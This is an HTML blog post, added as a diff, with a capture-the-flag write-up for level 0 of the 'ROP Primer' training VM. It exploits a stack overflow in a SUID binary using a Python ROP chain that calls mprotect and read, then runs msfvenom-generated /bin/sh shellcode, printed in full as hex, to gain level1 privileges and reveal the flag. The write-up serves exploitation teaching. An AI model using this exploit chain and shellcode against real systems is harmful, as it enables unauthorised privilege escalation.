@@ -1,0 +1,371 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head>
+<meta charset="utf-8">
+<meta name="description" content="">
+<meta name="keywords" content="">
+<meta name="author" content="">
+<meta name="generator" content="Hugo 0.15" />
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<link rel="stylesheet" href="http://rastamouse.me/css/style.css" type="text/css">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Source+Code+Pro:400,700" type="text/css">
+<link rel="alternate" href="http://rastamouse.me/index.xml" type="application/rss+xml" title="rastamouse.me">
+<title>ROP Primer: Level 0 - rastamouse.me</title>
+</head>
+<body>
+
+<header>
+  <div class="container">
+    <a class="path" href="http://rastamouse.me/">[rastamouse.me]</a>
+    <span class="caret"># _</span>
+  </div>
+</header>
+
+<div class="container">
+
+
+<main role="main" class="article">
+  
+<article class="single" itemscope itemtype="http://schema.org/BlogPosting">
+  <div class="meta">
+
+    <span class="key">published on</span>
+    <span class="val"><time itemprop="datePublished" datetime="2015-07-23">July 23, 2015</time></span>
+
+
+    <span class="key">in</span>
+    <span class="val">
+
+        <a href="http://rastamouse.me/categories/writeup">writeup</a>
+
+    </span>
+
+
+    <br>
+    <span class="key">tags:</span>
+    <span class="val">
+
+        <a href="http://rastamouse.me/tags/rop-primer">rop primer</a>
+
+    </span>
+
+  </div>
+  <h1 class="headline" itemprop="headline">ROP Primer: Level 0</h1>
+  <section class="body" itemprop="articleBody">
+    
+
+<p>This VM is meant as a small introduction to 32-bit return-oriented-programming on Linux. It contains three vulnerable binaries, that must be exploited using ROP. There are three levels in total (0 to 2).</p>
+
+<p>The VM is running a webserver with some instructions on how to get started with level0, by SSH’ing in.</p>
+
+<pre><code class="language-text">level0@rop:~$ ls -l
+
+-rw-r----- 1 level1 level1     25 Jan 20  2015 flag
+-rwsr-xr-x 1 level1 level1 595992 Jan 20  2015 level0
+</code></pre>
+
+<p>A SUID binary and a flag, both owned by <code>level1</code>. Exploiting the binary will give us access to the flag, nice and easy.</p>
+
+<pre><code class="language-text">level0@rop:~$ ./level0
+[+] ROP tutorial level0
+[+] What's your name? Rasta Mouse
+[+] Bet you can't ROP me, Rasta Mouse!
+
+level0@rop:~$ file level0
+level0: setuid ELF 32-bit LSB  executable, Intel 80386, version 1 (SYSV), statically linked, for GNU/Linux 2.6.26, BuildID[sha1]=fb91c352b4d0f9680d22497e348340fe88d0fdf8, not stripped
+
+level0@rop:~$ gdb -q level0
+Reading symbols from level0...(no debugging symbols found)...done.
+gdb-peda$ checksec
+CANARY    : disabled
+FORTIFY   : disabled
+NX        : ENABLED
+PIE       : disabled
+RELRO     : disabled
+
+level0@rop:~$ cat /proc/sys/kernel/randomize_va_space
+0
+</code></pre>
+
+<p>It’s handy that <code>peda</code> has been installed on the VM, as that should make things a bit easier. The binary is statically linked, compiled with a non-exec stack and ASLR has been disabled.</p>
+
+<p>We can force the binary into a seg fault by sending it a large input.</p>
+
+<pre><code class="language-text">level0@rop:~$ python -c 'print &quot;A&quot; * 50' | ./level0
+[+] ROP tutorial level0
+[+] What's your name? [+] Bet you can't ROP me, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA!
+Segmentation fault
+</code></pre>
+
+<p>We can find what is getting overwritten in gdb.</p>
+
+<pre><code class="language-text">level0@rop:~$ python -c 'print &quot;A&quot; * 50' &gt; exploit
+
+level0@rop:~$ gdb -q level0
+gdb-peda$ r &lt; exploit
+
+EAX: 0x0
+EBX: 0x0
+ECX: 0xbffff6ac --&gt; 0x80ca720 --&gt; 0xfbad2a84
+EDX: 0x80cb690 --&gt; 0x0
+ESI: 0x80488e0 (&lt;__libc_csu_fini&gt;:  push   ebp)
+EDI: 0x41578b07
+EBP: 0x41414141 ('AAAA')
+ESP: 0xbffff700 --&gt; 0x4141 ('AA')
+EIP: 0x41414141 ('AAAA')
+
+Stopped reason: SIGSEGV
+0x41414141 in ?? ()
+</code></pre>
+
+<p>We’ve overwritten EBP and crucially, EIP. Now find the offset.</p>
+
+<pre><code class="language-text">gdb-peda$ pattern_create 50
+'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA'
+
+Stopped reason: SIGSEGV
+0x41414641 in ?? ()
+
+gdb-peda$ pattern_offset 0x41414641
+1094796865 found at offset: 44
+</code></pre>
+
+<p>To test this out:</p>
+
+<pre><code class="language-text">level0@rop:~$ python -c 'print &quot;A&quot; * 44 + &quot;BBBB&quot;' &gt; exploit
+gdb-peda$ r &lt; exploit
+
+Stopped reason: SIGSEGV
+0x42424242 in ?? ()
+</code></pre>
+
+<p>This is good, as we have accurately targetted EIP. But now what… There are a couple of ways to solve this - one possibility is to construct a complete ROP chain and set the registers up to use an execve syscall. Another is to use some of the handy shortcuts barrebas placed.</p>
+
+<p><code>system</code> is not linked in the binary, but <code>mprotect</code> and <code>read</code> are.</p>
+
+<pre><code class="language-text">gdb-peda$ p system
+No symbol table is loaded.
+
+gdb-peda$ p mprotect
+$1 = {&lt;text variable, no debug info&gt;} 0x80523e0 &lt;mprotect&gt;
+
+gdb-peda$ p read
+$2 = {&lt;text variable, no debug info&gt;} 0x80517f0 &lt;read&gt;
+</code></pre>
+
+<p>We can use <code>mprotect</code> to effectively undo the protection provided by <code>NX</code>; then <code>read</code> shellcode in.</p>
+
+<pre><code class="language-text">gdb-peda$ b main
+gdb-peda$ r
+gdb-peda$ vmmap
+Start      End        Perm    Name
+0x08048000 0x080ca000 r-xp    /home/level0/level0
+0x080ca000 0x080cb000 rw-p    /home/level0/level0
+0x080cb000 0x080ef000 rw-p    [heap]
+0xb7fff000 0xb8000000 r-xp    [vdso]
+0xbffdf000 0xc0000000 rw-p    [stack]
+</code></pre>
+
+<h2 id="mprotect:04d2e7465572fb94993a8c8ea7ea7ff0">mprotect</h2>
+
+<p>These are the areas of memory, none of which are executable (donated by the <code>x</code> character). I’m going to make part of the <code>[stack]</code> region executable, so let’s start building our exploit.</p>
+
+<pre><code class="language-python">#/usr/bin/python
+
+import struct
+
+def p(x):
+        return struct.pack('&lt;L', x)
+
+rop = &quot;&quot;
+rop += &quot;A&quot; * 44
+rop += p(0x80523e0)     # mprotect
+rop += &quot;FAKE&quot;           # fake ret
+rop += p(0xbffdf000)    # stack
+rop += p(0x100)         # size
+rop += p(0x7)           # exec
+
+print rop
+</code></pre>
+
+<pre><code class="language-text">level0@rop:~$ python exploit.py &gt; exploit
+gdb-peda$ r &lt; exploit
+
+Stopped reason: SIGSEGV
+0x454b4146 in ?? ()
+
+gdb-peda$ vmmap
+Start      End        Perm    Name
+0xbffdf000 0xbffe0000 rwxp    mapped
+</code></pre>
+
+<p>The binary crashes on the <code>FAKE</code> return address and we can see that the area of memory we specified is now executable. To clear up and prepare for the next step, we should clear those arguments for <code>mprotect</code> off the stack. A <code>pop3ret</code> will do the job - to find one we can utilise the <code>ropgadget</code> in peda.</p>
+
+<pre><code class="language-text">gdb-peda$ ropgadget
+pop3ret = 0x8048882
+</code></pre>
+
+<p>Let’s use this as the return address for mprotect. For sanities sake, we’ll put a breakpoint there and step through the gadget.</p>
+
+<pre><code class="language-text">gdb-peda$ b *0x8048881
+
+Breakpoint 1, 0x08048882 in __libc_setup_tls ()
+
+=&gt; 0x8048882 &lt;__libc_setup_tls+498&gt;:    pop    esi
+   0x8048883 &lt;__libc_setup_tls+499&gt;:    pop    edi
+   0x8048884 &lt;__libc_setup_tls+500&gt;:    pop    ebp
+   0x8048885 &lt;__libc_setup_tls+501&gt;:    ret
+</code></pre>
+
+<p>If we run though, EIP eventually seg faults on 0.</p>
+
+<pre><code class="language-text">Stopped reason: SIGSEGV
+0x00000000 in ?? ()
+</code></pre>
+
+<p>We can now add a new instruction into the exploit, to ensure we still have control over execution flow.</p>
+
+<pre><code class="language-python">rop = &quot;&quot;
+rop += &quot;A&quot; * 44
+rop += p(0x80523e0)     # mprotect
+rop += p(0x8048882)     # pop3ret
+rop += p(0xbffdf000)    # stack
+rop += p(0x100)         # size
+rop += p(0x7)           # exec
+
+rop += &quot;BBBB&quot;
+</code></pre>
+
+<pre><code class="language-text">Stopped reason: SIGSEGV
+0x42424242 in ?? ()
+
+0xbffdf000 0xbffe0000 rwxp    mapped
+</code></pre>
+
+<h2 id="read:04d2e7465572fb94993a8c8ea7ea7ff0">read</h2>
+
+<p>Now we can set up our ROP to <code>read</code>. This will allow us to read shellcode from <code>stdin</code> into our mapped area of the stack, and execute.</p>
+
+<pre><code class="language-python">rop = &quot;&quot;
+rop += &quot;A&quot; * 44
+rop += p(0x80523e0)     # mprotect
+rop += p(0x8048882)     # pop3ret
+rop += p(0xbffdf000)    # stack
+rop += p(0x100)         # size
+rop += p(0x7)           # exec
+
+rop += p(0x80517f0)     # read
+rop += &quot;FAKE&quot;           # fake ret
+rop += p(0x0)           # stdin
+rop += p(0xbffdf000)    # stack
+rop += p(0x100)         # size
+</code></pre>
+
+<p>In setting up read; we specify a fake return again, where to read from (stdin), the area of memory we wish to read into and the amount of memory.</p>
+
+<pre><code class="language-text">Stopped reason: SIGSEGV
+0x454b4146 in ?? ()
+</code></pre>
+
+<p>Now let’s replace the fake return address with the same pop3ret we used earlier. Then write a new block we can segfault on.</p>
+
+<pre><code class="language-python">rop = &quot;&quot;
+rop += &quot;A&quot; * 44
+rop += p(0x80523e0)     # mprotect
+rop += p(0x8048882)     # pop3ret
+rop += p(0xbffdf000)    # stack
+rop += p(0x100)         # size
+rop += p(0x7)           # exec
+
+rop += p(0x80517f0)     # read
+rop += p(0x8048882)       # fake ret
+rop += p(0x0)           # stdin
+rop += p(0xbffdf000)    # stack
+rop += p(0x100)         # size 
+
+rop += &quot;BBBB&quot;
+</code></pre>
+
+<pre><code class="language-text">Stopped reason: SIGSEGV
+0x42424242 in ?? ()
+</code></pre>
+
+<h2 id="stdin:04d2e7465572fb94993a8c8ea7ea7ff0">stdin</h2>
+
+<p>Now we need to test that we can actually read something in from stdin and have it execute. We’ll replace <code>BBBB</code> with the address of our executable stack location and run the exploit outside gdb.</p>
+
+<pre><code class="language-python">#/usr/bin/python
+
+import struct
+
+def p(x):
+        return struct.pack('&lt;L', x)
+
+rop = &quot;&quot;
+rop += &quot;A&quot; * 44
+rop += p(0x80523e0)     # mprotect
+rop += p(0x8048882)     # pop3ret
+rop += p(0xbffdf000)    # stack
+rop += p(0x100)         # size
+rop += p(0x7)           # exec
+
+rop += p(0x80517f0)     # read
+rop += p(0x8048882)     # pop3ret 
+rop += p(0x0)           # stdin
+rop += p(0xbffdf000)    # stack
+rop += p(0x100)         # size 
+
+rop += p(0xbffdf000)
+
+print rop
+</code></pre>
+
+<p>A quick and easy way to test the exploit, is to use a trap. This will stop execution flow just like a breakpoint does in gdb, and we get a message on stdout to let us know it’s happened.</p>
+
+<pre><code class="language-text">level0@rop:~$ (python exploit.py; python -c 'print &quot;\xcc\xcc&quot;') | ./level0
+[+] ROP tutorial level0
+[+] What's your name? [+] Bet you can't ROP me, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA���!
+Trace/breakpoint trap
+</code></pre>
+
+<p>The final stage is to put some useful shellcode in.</p>
+
+<pre><code class="language-text">root@kali32:~# msfvenom -p linux/x86/exec cmd=/bin/sh -f c | tr -d \&quot; | tr -d &quot;;&quot; | tr -d '\n'
+
+\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68\x2f\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52\xe8\x08\x00\x00\x00\x2f\x62\x69\x6e\x2f\x73\x68\x00\x57\x53\x89\xe1\xcd\x80
+</code></pre>
+
+<pre><code class="language-text">level0@rop:~$ (python exploit.py; python -c 'print &quot;\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68\x2f\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52\xe8\x08\x00\x00\x00\x2f\x62\x69\x6e\x2f\x73\x68\x00\x57\x53\x89\xe1\xcd\x80&quot;'; cat) | ./level0
+[+] ROP tutorial level0
+[+] What's your name? [+] Bet you can't ROP me, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA���!
+id
+uid=1000(level0) gid=1000(level0) euid=1001(level1) groups=1001(level1),1000(level0)
+whoami
+level1
+</code></pre>
+
+<p>The additional <code>cat</code> keeps the shell alive.</p>
+
+<h2 id="flag:04d2e7465572fb94993a8c8ea7ea7ff0">Flag</h2>
+
+<pre><code class="language-text">cat flag
+flag{rop_the_night_away}
+</code></pre>
+
+  </section>
+</article>
+
+</main>
+
+
+</div>
+
+<footer>
+  <div class="container">
+    <span class="copyright">&copy; 2015  rastamouse.me - <a rel="license" href="http://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a></span>
+  </div>
+</footer>
+
+</body>
+</html>
+
